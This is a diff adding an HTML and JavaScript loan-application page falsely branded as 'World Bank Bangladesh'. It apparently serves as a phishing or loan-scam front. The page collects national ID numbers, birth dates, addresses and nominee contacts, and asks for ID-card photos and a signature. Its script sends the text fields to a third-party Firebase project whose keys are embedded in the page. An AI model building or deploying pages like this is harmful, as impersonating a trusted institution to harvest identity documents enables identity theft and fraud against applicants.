@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Personal Information</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Arial;
+background:#f1f5f9;
+}
+
+.container{
+max-width:420px;
+margin:30px auto;
+background:white;
+padding:20px;
+border-radius:20px;
+box-shadow:0 0 15px rgba(0,0,0,0.1);
+}
+
+.header{
+background:#0047d4;
+color:white;
+padding:20px;
+text-align:center;
+font-size:24px;
+font-weight:bold;
+border-radius:15px;
+margin-bottom:20px;
+}
+
+.title{
+text-align:center;
+font-size:22px;
+font-weight:bold;
+margin-bottom:20px;
+}
+
+label{
+font-weight:bold;
+font-size:14px;
+}
+
+input,select{
+width:100%;
+padding:14px;
+margin-top:8px;
+margin-bottom:15px;
+border-radius:12px;
+border:1px solid #cbd5e1;
+box-sizing:border-box;
+}
+
+button{
+width:100%;
+padding:15px;
+background:#0047d4;
+color:white;
+border:none;
+border-radius:15px;
+font-size:18px;
+font-weight:bold;
+margin-top:10px;
+cursor:pointer;
+}
+
+canvas{
+border:2px solid #cbd5e1;
+border-radius:15px;
+background:white;
+width:100%;
+height:150px;
+margin-bottom:15px;
+touch-action:none;
+}
+
+.uploadbox{
+border:2px dashed #94a3b8;
+border-radius:18px;
+padding:30px;
+text-align:center;
+margin-bottom:18px;
+background:#f8fafc;
+}
+
+.uploadicon{
+font-size:55px;
+margin-bottom:10px;
+}
+
+.uploadtext{
+font-size:16px;
+font-weight:bold;
+color:#475569;
+}
+
+.uploadbox input{
+margin-top:15px;
+}
+
+.clearbtn{
+width:auto;
+padding:10px 18px;
+font-size:14px;
+border-radius:10px;
+background:red;
+color:white;
+border:none;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="header">
+
+🌐 WORLD BANK BANGLADESH
+
+</div>
+
+<div class="title">
+
+Personal Information
+
+</div>
+
+<label>
+NID Number / এনআইডি নম্বর
+</label>
+
+<input type="number" id="nid">
+
+<label>
+Sex / লিঙ্গ
+</label>
+
+<select id="sex">
+
+<option value="">
+Select
+</option>
+
+<option>
+Male
+</option>
+
+<option>
+Female
+</option>
+
+<option>
+Other
+</option>
+
+</select>
+
+<label>
+Date Of Birth / জন্ম তারিখ
+</label>
+
+<input type="date" id="dob">
+
+<label>
+Current Address / বর্তমান ঠিকানা
+</label>
+
+<input type="text" id="currentAddress">
+
+<label>
+Permanent Address / স্থায়ী ঠিকানা
+</label>
+
+<input type="text" id="permanentAddress">
+
+<label>
+Loan Purpose / লোনের উদ্দেশ্য
+</label>
+
+<select id="purpose">
+
+<option value="">
+Select
+</option>
+
+<option>
+Personal / ব্যক্তিগত লোন
+</option>
+
+<option>
+Foreigner / প্রবাসী লোন
+</option>
+
+<option>
+Business / ব্যবসা লোন
+</option>
+
+<option>
+Students / ছাত্র লোন
+</option>
+
+<option>
+Home Loan / বাড়ি নির্মাণ লোন
+</option>
+
+<option>
+Agriculture / কৃষি লোন
+</option>
+
+<option>
+Employed / চাকুরিজীবী লোন
+</option>
+
+<option>
+Car Loan / যানবাহন লোন
+</option>
+
+<option>
+Others / অন্যান্য
+</option>
+
+</select>
+
+<label>
+Nominee Name / নমিনির নাম
+</label>
+
+<input type="text" id="nomineeName">
+
+<label>
+Nominee Relation / সম্পর্ক
+</label>
+
+<input type="text" id="nomineeRelation">
+
+<label>
+Nominee Mobile Number / নমিনির মোবাইল নম্বর
+</label>
+
+<input type="number" id="nomineeMobile">
+
+<div class="uploadbox">
+
+<div class="uploadicon">
+📸
+</div>
+
+<div class="uploadtext">
+Customer Photo Upload
+</div>
+
+<input type="file">
+
+</div>
+
+<div class="uploadbox">
+
+<div class="uploadicon">
+🪪
+</div>
+
+<div class="uploadtext">
+NID Front Side Upload
+</div>
+
+<input type="file">
+
+</div>
+
+<div class="uploadbox">
+
+<div class="uploadicon">
+🪪
+</div>
+
+<div class="uploadtext">
+NID Back Side Upload
+</div>
+
+<input type="file">
+
+</div>
+
+<label>
+Signature / স্বাক্ষর
+</label>
+
+<canvas id="signature" width="350" height="150">
+</canvas>
+
+<div style="text-align:right;margin-bottom:15px;">
+
+<button
+type="button"
+onclick="clearSignature()"
+class="clearbtn">
+
+Clear Signature
+
+</button>
+
+</div>
+
+<button
+type="button"
+onclick="saveInfo()">
+
+Next
+
+</button>
+
+</div>
+
+<script type="module">
+
+import { initializeApp }
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+
+getFirestore,
+doc,
+setDoc
+
+}
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyDoviQemxQYk-nel7Zc8cAzZhWJvxzbMcc",
+
+authDomain: "loan-a87af.firebaseapp.com",
+
+projectId: "loan-a87af",
+
+storageBucket: "loan-a87af.firebasestorage.app",
+
+messagingSenderId: "661290569837",
+
+appId: "1:661290569837:web:0f03ecdfde2da0867def64",
+
+measurementId: "G-2EMLCYHVWT"
+
+};
+
+const app =
+initializeApp(firebaseConfig);
+
+const db =
+getFirestore(app);
+
+window.saveInfo =
+async function(){
+
+try{
+
+let nid =
+document.getElementById("nid").value;
+
+let sex =
+document.getElementById("sex").value;
+
+let dob =
+document.getElementById("dob").value;
+
+let currentAddress =
+document.getElementById("currentAddress").value;
+
+let permanentAddress =
+document.getElementById("permanentAddress").value;
+
+let nomineeName =
+document.getElementById("nomineeName").value;
+
+let nomineeRelation =
+document.getElementById("nomineeRelation").value;
+
+let nomineeMobile =
+document.getElementById("nomineeMobile").value;
+
+if(
+nid=="" ||
+sex=="" ||
+dob=="" ||
+currentAddress=="" ||
+permanentAddress=="" ||
+document.getElementById("purpose").value=="" ||
+nomineeName=="" ||
+nomineeRelation=="" ||
+nomineeMobile==""
+){
+
+alert("সব তথ্য পূরণ করুন");
+
+return;
+
+}
+
+let mobile =
+localStorage.getItem("userMobile");
+
+if(!mobile){
+
+alert("User Login Not Found");
+
+return;
+
+}
+
+await setDoc(doc(db,"users",mobile),{
+
+nid:nid,
+
+sex:sex,
+
+dob:dob,
+
+currentAddress:currentAddress,
+
+permanentAddress:permanentAddress,
+
+purpose:
+document.getElementById("purpose").value,
+
+nomineeName:nomineeName,
+
+nomineeRelation:nomineeRelation,
+
+nomineeMobile:nomineeMobile
+
+},{merge:true});
+
+alert("Information Saved");
+
+window.location.href =
+"loan.html";
+
+}
+
+catch(error){
+
+alert(error.message);
+
+}
+
+}
+
+/* SIGNATURE */
+
+const canvas =
+document.getElementById("signature");
+
+const ctx =
+canvas.getContext("2d");
+
+let drawing = false;
+
+canvas.addEventListener("touchstart",start);
+
+canvas.addEventListener("touchend",end);
+
+canvas.addEventListener("touchmove",draw);
+
+function start(e){
+
+drawing = true;
+
+draw(e);
+
+}
+
+function end(){
+
+drawing = false;
+
+ctx.beginPath();
+
+}
+
+function draw(e){
+
+if(!drawing) return;
+
+e.preventDefault();
+
+const rect =
+canvas.getBoundingClientRect();
+
+const x =
+e.touches[0].clientX - rect.left;
+
+const y =
+e.touches[0].clientY - rect.top;
+
+ctx.lineWidth = 2;
+
+ctx.lineCap = "round";
+
+ctx.strokeStyle = "black";
+
+ctx.lineTo(x,y);
+
+ctx.stroke();
+
+ctx.beginPath();
+
+ctx.moveTo(x,y);
+
+}
+
+window.clearSignature =
+function(){
+
+ctx.clearRect(
+0,
+0,
+canvas.width,
+canvas.height
+);
+
+}
+
+</script>
+
+</body>
+
+</html>
